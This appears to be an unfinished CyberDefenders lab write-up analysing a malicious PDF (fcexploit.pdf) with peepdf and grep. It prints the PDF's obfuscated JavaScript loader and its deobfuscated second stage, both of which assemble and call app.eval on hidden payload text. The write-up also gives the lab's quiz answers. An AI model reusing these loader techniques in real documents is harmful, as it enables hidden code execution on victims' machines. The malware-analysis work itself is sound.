
# GetPDF

## Wireshark part

## PDF part

Parsing the PDF with peepdf.py failed since the pdf contains errors.

```
┌─[✗]─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $python2 /opt/pdf/peepdf/peepdf.py fcexploit.pdf
Error: An error has occurred while parsing an indirect object!!
```

Using the `-f` flag forces the file to ignore errors.

```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $python2 /opt/pdf/peepdf/peepdf.py -f fcexploit.pdf
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!
Warning: Python Imaging Library (PIL) is not installed!!

File: fcexploit.pdf
MD5: 659cf4c6baa87b082227540047538c2a
SHA1: a93bf00077e761152d4ff8a695c423d14c9a66c9
SHA256: ba3c7c763f7910ef956e27be054e9271b00d05aab9fb153cdf30001ce422d68a
Size: 25169 bytes
Version: 1.3
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 5
URIs: 0
Comments: 0
Errors: 2

Version 0:
	Catalog: 27
	Info: 11
	Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 22, 23, 24, 25, 26, 27, 28]
		Errors (1): [11]
	Streams (5): [5, 7, 9, 10, 11]
		Encoded (4): [5, 7, 9, 10]
	Objects with JS code (1): [5]
	Suspicious elements:
		/AcroForm (1): [27]
		/OpenAction (1): [1]
		/XFA (1): [28]
		/JS (1): [4]
		/JavaScript (1): [4]
		getAnnots (CVE-2009-1492) (1): [5]
```

The output from the peepdf.py and pdf-parser.py both says 18 and thats is the wrong answer.

So i looked more in to the PDF file with peepdf.py, and focused on the error that we got earlier.

Using interactive mode `-i` and analysing the error in the object `11`, we can see that there seemes to be another strean object in that object. 

```
PDF> errors 11

Missing /Length in stream object (1)
```

```
PPDF> object 11

<< /ModDate D:20100910021118
/CreationDate D:20100910021118
/Producer Scribus PDF Library 1.3.3.14
/Creator Scribus 1.3.3.14
/Title 10 0 R
/Trapped /False
/Keywords 
/Author  >>
stream
x��[Y��8~��"ʼ'
Ә-,���L�)�5�K�I��F��_�v�r��+��H##}p���ر#|��_<W:�8�ߖ�Œ,aLǷ۲���֔��/ҷ�>1H,�'\j�{J�'|RDf��x�9����|˱���$I�
```

Running peepdf.py with the `-l` flag allows us to ignore the `endstream` tag and parse the stream anyway.

Now a new embeded file appears.

So there is in reality 19 objects in the PDF file.

```
Question #4 19 objects in the PDF file
```

To find out how many filtering methods the objects are using, a simple string command will provide us with that answer with the help of grep.

```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $strings fcexploit.pdf | grep Filter
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
	/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
```

```
Question #5 is 4 diffrent filtering methods are used
```

With peepdf.py in interactive mode we can get the javascript code that is located in the object 5 with `js_code 5`

```javascript
var SSS = null;
var SS = "ev";
var $S = "";
$5 = "in";
app.doc.syncAnnotScan();
S$ = "ti";
if (app.plugIns.length != 0) {
    var $$ = 0;
    S$ += "tl";
    $5 += "fo";
    ____SSS = app.doc.getAnnots({
        nPage: 0
    });
    S$ += "e";
    $S = this.info.title;
}
var S5 = "";
if (app.plugIns.length > 3) {
    SS += "a";
    var arr = $S.split(/U_155bf62c9aU_7917ab39/);
    for (var $ = 1; $ < arr.length; $++) {
        S5 += String.fromCharCode("0x" + arr[$]);
    }
    SS += "l";
}
if (app.plugIns.length >= 2) {
    app[SS](S5);
}
```

We can see that $S refers to the "title" which i found out by making a quick grep
```
┌─[cluless@ParrotOS]─[~/malware_analysis/cyberdefenders/GetPDF]
└──╼ $strings fcexploit.pdf | grep -i title
/Title 10 0 R
```
Object 10 contains alot of obfuscated text (the whole text is not shown here)
```
PPDF> stream 10

U_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab395fU_155bf62c9aU_7917ab3953U_155bf62c9aU_7917ab3953U_155bf62c9aU...
```
We can se in the javascript that the object 10 is split on the text "U_155bf62c9aU_7917ab39"

I quickly created the same deobfuscation logic in python see [deobfuscation_stream_10.py](./scripts/deobfuscation_stream_10.py)

The deobfuscated code is:

```javascript
Download file
Open in new tab

SS = 1;
____$5 = ____SSS[____SS].subject;
____$S = 0;
____$ = ____$5.replace(/X_17844743X_170987743/g, "%");
____S5 = ____SSS[____$S].subject;
____$ += ____S5.replace(/89af50d/g, "%");
____$ = ____$.replace(/\n/, "");
____$ = ____$.replace(/\r/, "");
____S$ = unescape(____$);
app.eval(____S$);
```
TODO kolla anoteringarna :)